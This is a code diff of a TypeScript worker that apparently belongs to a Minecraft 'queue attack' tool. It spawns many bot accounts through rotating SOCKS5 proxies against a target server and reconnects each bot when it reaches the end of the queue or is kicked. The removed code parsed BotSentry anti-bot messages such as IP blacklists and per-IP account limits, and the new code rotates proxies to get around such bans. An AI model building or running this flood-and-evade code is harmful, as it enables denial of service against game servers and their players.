@@ -1,19 +1,19 @@
 import { parentPort, workerData as anyWorkerData } from 'worker_threads'
-import { QueueAttackOptions } from './types'
+import { AttackOptions } from '../../utils/types'
 import 'colors'
 import { getRandomArbitrary, sleep } from 'emberutils'
 import { Client, createClient } from 'minecraft-protocol'
 import { SocksClient } from 'socks'
-import { log, shuffle } from '../shared'
-import prismarineChat from "prismarine-chat";
+import {kickHandler, log, shuffle} from '../shared'
+import prismarineChat from 'prismarine-chat'
 
 const chatInstance = prismarineChat('1.12')
-const {fromNotch} = chatInstance
+const { fromNotch } = chatInstance
 
-const queueRegex = /(?<=Position in queue: )\d+/gm
+// const queueRegex = /(?<=Position in queue: )\d+/gm
 const spaceRegex = /\s{2,}/gm
 
-const workerOptions: QueueAttackOptions = anyWorkerData
+const workerOptions: AttackOptions = anyWorkerData
 
 async function awaitReady () {
   return await new Promise<void>(resolve => {
@@ -30,6 +30,8 @@ async function main () {
   const usernames = workerOptions.usernames
 
   shuffle(usernames)
+  if (workerOptions.proxy)
+    shuffle(workerOptions.proxy)
 
   let i = 0
   for (const username of usernames) {
@@ -40,16 +42,18 @@ async function main () {
         await sleep(timeout)
       }
 
-        return createClient({
-          username: username,
-          host: workerOptions.host,
-          port: workerOptions.port,
-          version: '1.12.2',
-          connect: workerOptions.proxy ? (client) => {
-            SocksClient.createConnection({
+      return createClient({
+        username: username,
+        host: workerOptions.host,
+        port: workerOptions.port,
+        version: '1.12.2',
+        connect: (workerOptions.proxy != undefined)
+          ? async (client) => {
+            const proxy = workerOptions.proxy![i]
+            return await SocksClient.createConnection({
               proxy: {
-                host: '94.231.144.114',
-                port: 1080,
+                host: proxy.host,
+                port: proxy.port,
                 type: 5
               },
               command: 'connect',
@@ -67,68 +71,46 @@ async function main () {
                 log(`[${username}] Proxy socket closed`.red)
               } else console.log(err)
             })
-          } : undefined
-        })
+          }
+          : undefined
+      })
     }
 
-    i++
-    log(`[${i}/${usernames.length}] Creating bot ${username}... (${usernames.length - i} left)`.green)
-
+    log(`[${i + 1}/${usernames.length}] Creating bot ${username}... (${usernames.length - i} left)`.green)
     let bot = await createBot()
+    registerListeners()
+
+    function registerListeners () {
+      bot.once('login', botLoginHandler)
+      bot.once('kicked', reason => kickHandler(reason, username))
+    }
 
     function botLoginHandler () {
       log(`[${username}] Logged in`.green)
-      bot.on('chat', async function messageHandler (packet: any) {
-        const object = fromNotch(packet.message);
+      bot.on('chat', async packet => {
+        const object = fromNotch(packet.message)
         const message = object.toString()
 
         if (message === '' || message === ' ' || message === '\u200b' || !message || spaceRegex.test(message)) return
 
         log(`[${username}] ${message}`.yellow)
-        if (message.includes('7b7t')) {
+        if (message.includes('8b8t')) {
           log(`[${username}] Reached the end of the queue, ending the connection and reconnecting...`.green)
           bot.end()
           bot = await createBot()
-          bot.once('login', () => {
-            bot.removeAllListeners('messagestr')
-            botLoginHandler()
-          })
-        } else bot.once('messagestr', messageHandler)
+          registerListeners()
+        }
       })
-      bot.once('kicked', reason => {
-        reason = JSON.parse(reason).text.toString()
-        log(`[${username}] ${reason.red}`.yellow + ', recreating the bot...')
-        log(`[${username}] Recreating the bot...`.green)
+      bot.once('kicked', async reason => {
+        const object = fromNotch(reason)
+        log(`[${username}] ${object.toString().red}`.yellow + ', recreating the bot...')
         bot.end()
-        createBot()
-        bot.once('login', () => {
-          bot.removeAllListeners()
-          botLoginHandler()
-        })
+        bot = await createBot()
+        registerListeners()
       })
     }
 
-    bot.once('login', botLoginHandler)
-    bot.once('kicked', reason => {
-      const jsonReason = JSON.parse(reason)
-      try {
-        if (jsonReason.extra[0].extra[1].text.includes('BotSentry') && jsonReason.extra[0].extra[5].text.includes('IP is blacklisted')) {
-          log(`[${username}] IP blacklist by BotSentry`.red)
-        } else if (jsonReason.extra[0].extra[3].text.includes('Bot Attack')) {
-          log(`[${username}] BotSentry AntiBot mode is on for ${jsonReason.extra[0].extra[7]}s`.red)
-        } else if (jsonReason.extra[0].extra[3].text.includes('limit of accounts')) {
-          log(`[${username}] IP blacklist for per-IP account limit by BotSentry`.red)
-        } else if (jsonReason.extra[0].extra[5].text.includes('dangerous activity')) {
-          log(`[${username}] BotSentry is analyzing the connection`.red)
-        } else {
-          console.log(jsonReason.extra[0])
-        }
-      } catch (err: any) {
-        log(err)
-        log(reason)
-        log(jsonReason)
-      }
-    })
+    i++
   }
 }
 
